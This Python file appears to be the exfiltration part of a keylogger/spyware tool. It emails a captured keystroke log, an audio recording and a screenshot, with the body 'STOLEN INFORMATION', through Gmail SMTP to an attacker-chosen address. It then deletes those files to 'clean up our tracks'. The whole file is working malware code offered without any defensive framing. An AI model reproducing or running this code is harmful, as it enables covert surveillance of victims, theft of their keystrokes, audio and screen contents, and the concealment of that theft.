# email
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

import smtplib

import os

# screenshot
screenshot_file = "screenshot.png"

# logger
keys_information = "key_log.txt"

# email
toaddr = "[TO EMAIL]"
email_address = "[SENDERS EMAIL]"
password = "[SENDERS EMAIL ACCT PASSWORD]"
keyLogPath = "key_log.txt"
audioPath = "output.wav"
screenshotPath = "screenshot.png"

# email controls
def send_email(filename, attachment, toaddr):

    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = email_address

    msg['To'] = toaddr

    msg['Subject'] = "Log File"

    body = "STOLEN INFORMATION"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()

send_email(keys_information, keyLogPath, toaddr)
send_email("output.wav", audioPath, toaddr)
send_email("screenshot.png", screenshotPath, toaddr)

# Clean up our tracks and delete files
delete_files = [keyLogPath, audioPath, screenshotPath]
for file in delete_files:
    os.remove(file)
